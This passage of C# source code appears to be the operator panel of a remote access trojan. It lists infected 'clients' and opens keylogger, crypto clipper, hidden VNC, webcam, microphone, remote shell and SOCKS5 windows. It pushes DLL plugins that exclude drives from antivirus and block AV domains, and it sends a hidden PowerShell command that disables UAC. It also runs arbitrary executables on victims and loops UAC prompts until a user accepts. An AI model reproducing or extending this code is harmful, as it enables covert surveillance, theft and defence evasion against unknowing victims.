                EventHandler tagWidthH = (_, _) =>
                {
                    if (!_suppressColumnSave && c.Width.UnitType == DataGridLengthUnitType.Pixel)
                    {
                        _suppressColumnSave = true;
                        c.Width = new DataGridLength(1, DataGridLengthUnitType.Star);
                        _suppressColumnSave = false;
                    }
                };
                desc.AddValueChanged(c, tagWidthH);
                _columnPersistenceHandlers.Add((desc, c, tagWidthH));
            }
            else
            {
                EventHandler widthH = (_, _) =>
                {
                    if (_suppressColumnSave) return;
                    if (c.Width.UnitType == DataGridLengthUnitType.Pixel)
                        SaveGridColumnWidths();
                };
                desc.AddValueChanged(c, widthH);
                _columnPersistenceHandlers.Add((desc, c, widthH));
            }
        }

        GridClients.SizeChanged += (s, e) =>
        {
            if (_autoFitColumns && e.WidthChanged)
                Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
                    new Action(ApplyAdaptiveOnlineWidths));
        };
    }

    // Collapses a column that was resized to near-zero, persists its hidden state,
    // and syncs the settings-panel checkbox so the UI stays coherent.
    // Returns the original English header key for a column regardless of current language translation.
    // DataGridTextColumns are tracked in _colOriginalHeader; named TemplateColumns are handled explicitly.
    private string GetOriginalKey(System.Windows.Controls.DataGridColumn col)
    {
        if (col is System.Windows.Controls.DataGridTextColumn tc &&
            _colOriginalHeader.TryGetValue(tc, out var orig))
            return orig;
        if (col == ColStatusHdr)       return "STATUS";
        if (col == ColCamHdr)          return "CAM";
        if (col == ColOnlineIpHdr)      return "IP";
        if (col == ColOnlinePingHdr)    return "PING";
        if (col == ColOnlineTagHdr)     return "TAG";
        if (col == ColAllClientsIpHdr)  return "IP";
        if (col == ColAllClientsTagHdr) return "TAG";
        return col.Header?.ToString() ?? "";
    }

    private void SaveGridColumnWidths()
    {
        if (_suppressColumnSave) return;
        foreach (var col in GridClients.Columns)
        {
            string key = GetOriginalKey(col);
            if (string.IsNullOrEmpty(key) || key == "TAG") continue;
            if (col.Width.UnitType == DataGridLengthUnitType.Star) continue; // star = default, not persisted
            double w = col.ActualWidth;
            if (w > 0) UiPrefs.Set($"ColWidth_{key}", (int)w);
        }
    }

    // Per-column (full, min) pixel widths for the All Clients DataGrid.
    // Full = ideal at 1004 px+ available; min = minimum readable across all 10 UI languages.
    private static readonly Dictionary<string, (int full, int min)> _allClientsColSpec =
        new(StringComparer.OrdinalIgnoreCase)
        {
            ["IP"]         = (120, 90),
            ["ID"]         = (65,  50),
            ["USER"]       = (100, 90),  // "UTILISATEUR"/"ПОЛЬЗОВАТЕЛЬ" header
            ["COUNTRY"]    = (80,  65),
            ["MACHINE"]    = (110, 80),
            ["OS"]         = (85,  60),
            ["AV"]         = (105, 78),
            ["RAM"]        = (75,  50),
            ["FIRST SEEN"] = (132, 100), // "1ÈRE VUE"/"İLK GÖRÜŞ" header + datetime
            ["LAST SEEN"]  = (132, 100), // "DERNIÈRE VUE"(fr=12 chars) header
        };
    // kFull=1004, kMin=763

    private void RestoreAllClientsColumnWidths()
    {
        bool hasSaved = false;
        foreach (var col in GridAllClients.Columns)
        {
            string h = GetOriginalKey(col);
            if (!string.IsNullOrEmpty(h) && h != "TAG" && UiPrefs.GetInt($"AllColWidth_{h}", 0) > 20)
            { hasSaved = true; break; }
        }

        if (hasSaved && !_autoFitColumns)
        {
            foreach (var col in GridAllClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (string.IsNullOrEmpty(key)) continue;
                if (key == "TAG") { col.Width = new DataGridLength(1, DataGridLengthUnitType.Star); continue; }
                int saved = UiPrefs.GetInt($"AllColWidth_{key}", 0);
                if (saved > 20) col.Width = new DataGridLength(saved);
            }
        }
        else
        {
            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
                new Action(ApplyAdaptiveAllClientsWidths));
        }
    }

    private void SetupAllClientsColumnPersistence()
    {
        var desc = System.ComponentModel.DependencyPropertyDescriptor
            .FromProperty(System.Windows.Controls.DataGridColumn.WidthProperty,
                          typeof(System.Windows.Controls.DataGridColumn));
        foreach (var col in GridAllClients.Columns)
        {
            var c = col;
            if (GetOriginalKey(c) == "TAG")
            {
                EventHandler tagWidthH = (_, _) =>
                {
                    if (!_suppressColumnSave && c.Width.UnitType == DataGridLengthUnitType.Pixel)
                    {
                        _suppressColumnSave = true;
                        c.Width = new DataGridLength(1, DataGridLengthUnitType.Star);
                        _suppressColumnSave = false;
                    }
                };
                desc.AddValueChanged(c, tagWidthH);
                _columnPersistenceHandlers.Add((desc, c, tagWidthH));
            }
            else
            {
                EventHandler widthH = (_, _) =>
                {
                    if (_suppressColumnSave) return;
                    if (c.Width.UnitType == DataGridLengthUnitType.Pixel)
                        SaveAllClientsColumnWidths();
                };
                desc.AddValueChanged(c, widthH);
                _columnPersistenceHandlers.Add((desc, c, widthH));
            }
        }

        GridAllClients.SizeChanged += (s, e) =>
        {
            if (_autoFitColumns && e.WidthChanged)
                Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
                    new Action(ApplyAdaptiveAllClientsWidths));
        };
    }

    private void SaveAllClientsColumnWidths()
    {
        if (_suppressColumnSave) return;
        foreach (var col in GridAllClients.Columns)
        {
            string key = GetOriginalKey(col);
            if (string.IsNullOrEmpty(key) || key == "TAG") continue;
            if (col.Width.UnitType == DataGridLengthUnitType.Star) continue; // star = default, not persisted
            double w = col.ActualWidth;
            if (w > 0) UiPrefs.Set($"AllColWidth_{key}", (int)w);
        }
    }

    private void GridClients_PreviewMouseLeftButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
    {
        var row = FindVisualAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
        if (row == null) return;

        bool ctrl = (System.Windows.Input.Keyboard.Modifiers & System.Windows.Input.ModifierKeys.Control) != 0;
        if (ctrl)
        {
            row.IsSelected = !row.IsSelected;
        }
        else
        {
            GridClients.UnselectAll();
            row.IsSelected = true;
            GridClients.Focus();
        }
        e.Handled = true;
    }

    private void GridClients_MouseRightButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
    {
        var hit = VisualTreeHelper.HitTest(GridClients, e.GetPosition(GridClients));
        var row = hit != null ? FindVisualAncestor<DataGridRow>(hit.VisualHit) : null;
        if (row != null) { row.IsSelected = true; GridClients.Focus(); }
    }


    private void GridAllClients_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        Dispatcher.BeginInvoke(() => {
            try { GridAllClients.CurrentCell = new System.Windows.Controls.DataGridCellInfo(); } catch { }
        }, System.Windows.Threading.DispatcherPriority.Background);
    }

    private void GridAllClients_MouseRightButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
    {
        var hit = VisualTreeHelper.HitTest(GridAllClients, e.GetPosition(GridAllClients));
        var row = hit != null ? FindVisualAncestor<DataGridRow>(hit.VisualHit) : null;
        if (row != null) { row.IsSelected = true; GridAllClients.Focus(); }
    }

    private void GridAllClients_ContextMenuOpening(object sender, ContextMenuEventArgs e)
    {
        if (GridAllClients.SelectedItems.Count == 0) e.Handled = true;
    }

    private void GridWinNotify_ContextMenuOpening(object sender, ContextMenuEventArgs e)
    {
        if (GridWinNotify.SelectedItem == null) e.Handled = true;
    }

    private void GridAutoTasks_ContextMenuOpening(object sender, ContextMenuEventArgs e)
    {
        if (GridAutoTasks.SelectedItems.Count == 0) e.Handled = true;
    }

    private void BinderGrid_ContextMenuOpening(object sender, ContextMenuEventArgs e)
    {
        if (BinderGrid.SelectedItems.Count == 0) e.Handled = true;
    }

    private static T? FindVisualAncestor<T>(DependencyObject? source) where T : DependencyObject
    {
        var current = source;
        while (current != null)
        {
            if (current is T match) return match;
            current = VisualTreeHelper.GetParent(current);
        }
        return null;
    }

    private void GridClients_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key == System.Windows.Input.Key.A && System.Windows.Input.Keyboard.Modifiers == System.Windows.Input.ModifierKeys.Control)
        {
            GridClients.SelectAll();
            e.Handled = true;
        }
    }

    private void GridClients_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        int count = GridClients.SelectedItems.Count;
        if (count > 0)
        {
            TxtSelCount.Text       = $"{count} {Lang.Get("SEL_SELECTED")}";
            SelCountBadge.Visibility = Visibility.Visible;
        }
        else
        {
            SelCountBadge.Visibility = Visibility.Collapsed;
        }
    }

    internal void OpenFeatureWindow<T>(string clientId, Func<T> factory) where T : Window
    {
        string key = $"{clientId}:{typeof(T).Name}";
        if (_featureWindows.TryGetValue(key, out var existing))
        {
            if (existing.WindowState == WindowState.Minimized)
                existing.WindowState = WindowState.Normal;
            existing.Activate();
            return;
        }

        var winTypeName = typeof(T).Name;

        T win;
        try
        {
            win = factory();
        }
        catch (Exception ex)
        {
            Log($"[ERR] {winTypeName} factory() crash: {ex.GetType().Name}: {ex.Message}");
            Log($"[ERR] Stack: {ex.StackTrace?.Split('\n').FirstOrDefault()?.Trim()}");
            WriteFeatureLog(winTypeName, clientId, ex);
            return;
        }

        // Automatically set title and header label on creation
        string tag = "";
        ConnectedClient? busyClient = null;
        if (_server != null && _server.ConnectedClients.TryGetValue(clientId, out var client))
        {
            tag = client.Tag;
            busyClient = client;
        }
        string friendly = GetFriendlyWindowName(win);
        win.Title = string.IsNullOrEmpty(tag) ? $"{friendly} — {clientId}" : $"{friendly} — {tag} ({clientId})";

        if (win.FindName("TxtTitle") is TextBlock tbTitle)
        {
            tbTitle.Text = string.IsNullOrEmpty(tag) ? clientId : $"{tag} ({clientId})";
        }
        else if (win.FindName("TxtClientId") is TextBlock tbClient)
        {
            tbClient.Text = string.IsNullOrEmpty(tag) ? $"[ {clientId} ]" : $"[ {tag} ({clientId}) ]";
        }

        if (busyClient != null) busyClient.ActiveSessions++;

        ApplySoftwareRendering(win);

        // Generic fade-in for windows that don't manage their own (those set Opacity=0 in their ctor)
        if (win.Opacity > 0)
        {
            win.Opacity = 0;
            win.Loaded += (_, _) =>
            {
                var ease = new System.Windows.Media.Animation.CubicEase
                    { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut };
                win.BeginAnimation(OpacityProperty,
                    new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(180)) { EasingFunction = ease });
            };
        }

        _featureWindows[key] = win;
        win.Closed += (_, _) => { _featureWindows.Remove(key); if (busyClient != null) busyClient.ActiveSessions--; };
        try
        {
            win.Show();
            if (typeof(T).Name != "RemoteDesktopWindow" && typeof(T).Name != "WebcamWindow")
                Log($"[ADMIN] {friendly} opened for client {clientId}.");
            // Suppress DWM 1px accent border on all feature windows for consistent chrome across themes
            SuppressFeatureWindowBorder(win);
        }
        catch (Exception ex)
        {
            _featureWindows.Remove(key);
            Log($"[ERR] {friendly}.Show() crash: {ex.GetType().Name}: {ex.Message}");
            Log($"[ERR] Stack: {ex.StackTrace?.Split('\n').FirstOrDefault()?.Trim()}");
            WriteFeatureLog(friendly, clientId, ex);
        }
    }

    private static void WriteFeatureLog(string feature, string clientId, Exception ex)
    {
        try
        {
            var path = System.IO.Path.Combine(
                System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? ".",
                "crash.log");
            System.IO.File.AppendAllText(path,
                $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] FEATURE CRASH — {feature} / client={clientId}\r\n{ex}\r\n\r\n");
        }
        catch { }
    }

    private void ApplySoftwareRendering(Window win)
    {
        win.SourceInitialized += (sender, _) =>
        {
            try
            {
                if (sender is Visual vis
                    && PresentationSource.FromVisual(vis) is System.Windows.Interop.HwndSource hw)
                    hw.CompositionTarget.RenderMode = System.Windows.Interop.RenderMode.SoftwareOnly;
            }
            catch (Exception ex)
            {
                Log($"[WARN] SoftwareOnly render failed for {win.GetType().Name}: {ex.Message}");
            }
        };
    }

    private void RemoteShell_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        LogAdminAction("Remote Shell", clients.Count, clients[0].Id);
        var server = _server;
        var newClients = new List<ConnectedClient>();
        foreach (var c in clients)
        {
            string key = $"{c.Id}:RemoteShellWindow";
            if (_featureWindows.TryGetValue(key, out var existing))
            {
                if (existing.WindowState == WindowState.Minimized)
                    existing.WindowState = WindowState.Normal;
                existing.Activate();
            }
            else newClients.Add(c);
        }
        if (newClients.Count == 0) return;
        var win = new RemoteShellWindow(server, newClients);
        var keys = newClients.Select(c => $"{c.Id}:RemoteShellWindow").ToList();
        foreach (var k in keys) _featureWindows[k] = win;
        foreach (var c in newClients) c.ActiveSessions++;
        win.Closed += (_, _) => { foreach (var k in keys) _featureWindows.Remove(k); foreach (var c in newClients) c.ActiveSessions--; };
        ApplySoftwareRendering(win);
        win.Show();
    }

    private async void RemoteDesktop_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        LogAdminAction("Remote Desktop", clients.Count, clients[0].Id);
        var server = _server;
        var area = SystemParameters.WorkArea;
        const int step = 28, margin = 40, winW = 900, winH = 560;
        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
        int i = 0;
        foreach (var c in clients)
        {
            int s = (i % maxSteps) * step;
            OpenFeatureWindow<RemoteDesktopWindow>(c.Id, () =>
            {
                var w = new RemoteDesktopWindow(server, c.Id);
                w.Left = area.Left + margin + s;
                w.Top  = area.Top  + margin + s;
                return w;
            });
            i++;
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void RemoteWebcam_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        LogAdminAction("Remote Webcam", clients.Count, clients[0].Id);
        var server = _server;

        // Filter to clients that actually have a camera
        var eligible = clients.Where(c => !c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase)).ToList();
        if (eligible.Count == 0) return;

        // Determine layout mode
        WebcamLayout layout = WebcamLayout.Cascade; // default for < 4
        if (eligible.Count >= 4)
        {
            var result = WebcamLayoutDialog.Prompt(this);
            if (result == null) return; // user cancelled
            layout = result.Value;
        }

        var area = SystemParameters.WorkArea;

        if (layout == WebcamLayout.Tile)
        {
            // Calculate grid dimensions
            int count = eligible.Count;
            int cols = (int)Math.Ceiling(Math.Sqrt(count));
            int rows = (int)Math.Ceiling((double)count / cols);
            double tileW = area.Width / cols;
            double tileH = area.Height / rows;
            // Enforce minimums
            tileW = Math.Max(tileW, 420);
            tileH = Math.Max(tileH, 320);

            int i = 0;
            foreach (var c in eligible)
            {
                int col = i % cols;
                int row = i / cols;
                double left = area.Left + col * tileW;
                double top  = area.Top  + row * tileH;
                double w = tileW;
                double h = tileH;

                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
                {
                    var win = new WebcamWindow(server, c.Id);
                    win.Left   = left;
                    win.Top    = top;
                    win.Width  = w;
                    win.Height = h;
                    return win;
                });
                i++;
                if (eligible.Count > 1) await Task.Delay(80);
            }
        }
        else // Cascade
        {
            const int step = 28, margin = 60, winW = 700, winH = 520;
            int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
            int i = 0;
            foreach (var c in eligible)
            {
                int s = (i % maxSteps) * step;
                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
                {
                    var w = new WebcamWindow(server, c.Id);
                    w.Left = area.Left + margin + s;
                    w.Top  = area.Top  + margin + s;
                    return w;
                });
                i++;
                if (eligible.Count > 1) await Task.Delay(80);
            }
        }
    }

    private async void TcpManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<TcpManagerWindow>(c.Id, () => new TcpManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void StartupManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<StartupManagerWindow>(c.Id, () => new StartupManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void FileManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<FileManagerWindow>(c.Id, () => new FileManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Microphone_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<MicrophoneWindow>(c.Id, () => new MicrophoneWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Fun_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<FunWindow>(c.Id, () => new FunWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void ProcessManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<ProcessManagerWindow>(c.Id, () => new ProcessManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Socks5_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<Socks5Window>(c.Id, () => new Socks5Window(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    // ── New feature window handlers ──────────────────────────────────────────

    private async void ServiceManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<ServiceManagerWindow>(c.Id, () => new ServiceManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void WindowManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<WindowManagerWindow>(c.Id, () => new WindowManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void RegistryEditor_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            if (!c.IsAdmin)
            {
                var r = MessageBox.Show(
                    $"Client {c.Id} is NOT running as administrator.\n\nThe Registry Editor requires admin privileges to write/delete keys.\nReading HKCU keys will still work.\n\nOpen anyway?",
                    "Admin Recommended", MessageBoxButton.YesNo, MessageBoxImage.Warning);
                if (r != MessageBoxResult.Yes) continue;
            }
            OpenFeatureWindow<RegistryEditorWindow>(c.Id, () => new RegistryEditorWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void InstalledApps_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<InstalledAppsWindow>(c.Id, () => new InstalledAppsWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void DeviceManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<DeviceManagerWindow>(c.Id, () => new DeviceManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void PerformanceMonitor_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<PerformanceMonitorWindow>(c.Id, () => new PerformanceMonitorWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    // ── Miscellaneous quick-send to selected clients ────────────────────────
    #pragma warning disable CS4014
    private void QuickExcludeCDrive_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            // Compile (or use cache) then send to selected clients only
            var cachePath = PluginCachePath("Exclude C:\\");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_ExcludeCDrive_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Exclude C:\\ sent to {clients.Count} client(s)."));
        });
    }

    private void QuickBlockAvDns_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            var cachePath = PluginCachePath("Block AV DNS");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_BlockAvDomains_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block AV DNS sent to {clients.Count} client(s)."));
        });
    }

    private void QuickBlockReset_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            var cachePath = PluginCachePath("Block Reset");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_BlockReset_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block WSReset sent to {clients.Count} client(s)."));
        });
    }
    private async void QuickDisableUac_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var adminClients = clients.Where(c => c.IsAdmin).ToList();
        if (adminClients.Count == 0) { Log("[!] Disable UAC: no admin clients selected."); return; }

        var cmd = "powershell -NoP -NonI -W Hidden -Command \"" +
            "$p='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';" +
            "Set-ItemProperty $p EnableLUA 0 -Type DWord -Force;" +
            "Set-ItemProperty $p ConsentPromptBehaviorAdmin 0 -Type DWord -Force;" +
            "Set-ItemProperty $p ConsentPromptBehaviorUser 0 -Type DWord -Force;" +
            "Set-ItemProperty $p PromptOnSecureDesktop 0 -Type DWord -Force\"";

        var pkt = new Protocol.Packet { Type = Protocol.PacketType.AutoTaskShell, Data = cmd };
        await Task.WhenAll(adminClients.Select(c => _server.SendToClient(c.Id, pkt)));
        Log($"[ADMIN] Disable UAC sent to {adminClients.Count} admin client(s) (takes effect after reboot).");
    }
    #pragma warning restore CS4014

    private TikTokWindow? _tikTokWindow;
    private void TikTok_Click(object sender, RoutedEventArgs e)
    {
        if (_server == null) return;
        if (_tikTokWindow == null || !_tikTokWindow.IsLoaded)
        {
            // Materialize now — lazy LINQ over SelectedItems would evaluate after window opens
            var selectedIds = GridClients.SelectedItems.Cast<ConnectedClient>().Select(c => c.Id).ToList();
            _tikTokWindow = new TikTokWindow(_server, selectedIds) { Owner = this };
            ApplySoftwareRendering(_tikTokWindow);
            _tikTokWindow.Show();
        }
        else
            _tikTokWindow.Activate();
    }

    private async void Keylogger_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<KeyloggerWindow>(c.Id, () => new KeyloggerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void CryptoClipper_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<CryptoClipperWindow>(c.Id, () => new CryptoClipperWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Hvnc_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var server = _server;
        var area = SystemParameters.WorkArea;
        const int step = 28, margin = 60, winW = 900, winH = 580;
        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
        int i = 0;
        foreach (var c in clients)
        {
            int s = (i % maxSteps) * step;
            OpenFeatureWindow<HvncWindow>(c.Id, () =>
            {
                var w = new HvncWindow(server, c.Id);
                w.Left = area.Left + margin + s;
                w.Top  = area.Top  + margin + s;
                return w;
            });
            i++;
            if (clients.Count > 1) await Task.Delay(80);
        }
    }


    private async void RemoteFileExec_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select file to execute on client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new RemoteFileExecData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.RemoteFileExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, packet)));
            Log($"[ADMIN] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
            SetStatus($"File sent to {clients.Count} client(s).");
        }
        catch (Exception ex)
        {
            Log($"[!] Remote file exec failed: {ex.Message}");
        }
    }

    private async void UpdateClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select client binary to update client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new UpdateClientData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.UpdateClient,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, packet)));
            Log($"[ADMIN] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
            SetStatus($"Update file sent to {clients.Count} client(s).");
        }
        catch (Exception ex)
        {
            Log($"[!] Update client failed: {ex.Message}");
        }
    }

    private async void UninstallClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dlg = new ConfirmDialog(
            Lang.Get("POPUP_CONFIRM"),
            string.Format(Lang.Get("POPUP_UNINSTALL_CONFIRM"), clients.Count),
            Lang.Get("POPUP_YES"),
            Lang.Get("POPUP_NO")) { Owner = this };
        if (dlg.ShowDialog() != true) return;

        var packet = new Packet { Type = PacketType.Uninstall };

        foreach (var client in clients) client.PendingUninstall = true;
        await Task.WhenAll(clients.Select(async c =>
        {
            try { await _server.SendToClient(c.Id, packet); } catch { }
            Log($"[ADMIN] Uninstall sent to {c.Username}@{c.IP} ({c.Id}).");
        }));

        // Force-disconnect immediately so the client disappears from the panel right away
        // without waiting for the TCP close from the client side (same behaviour as Dark Worm).
        // PendingUninstall=true suppresses the error log in the ReadLoop finally block.
        foreach (var c in clients) _server?.DisconnectClient(c.Id);

        SetStatus($"Uninstall sent to {clients.Count} client(s).");
    }

    // ── UAC Elevation ───────────────────────────────

    private async void RequestElevation_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var packet = new Packet { Type = PacketType.RequestElevation };
        await Task.WhenAll(clients.Select(async c =>
        {
            try { await _server.SendToClient(c.Id, packet); } catch { }
            Log($"[ADMIN] [UAC] Elevation request sent to {c.Username}@{c.IP}.");
        }));

        SetStatus($"UAC elevation sent to {clients.Count} client(s).");
    }

    private async void RequestElevationLoop_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var result = MessageBox.Show(
            $"Loop UAC popup on {clients.Count} machine(s) until user accepts?",
            "Confirm UAC Loop",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result != MessageBoxResult.Yes) return;

        var packet = new Packet { Type = PacketType.RequestElevationLoop };
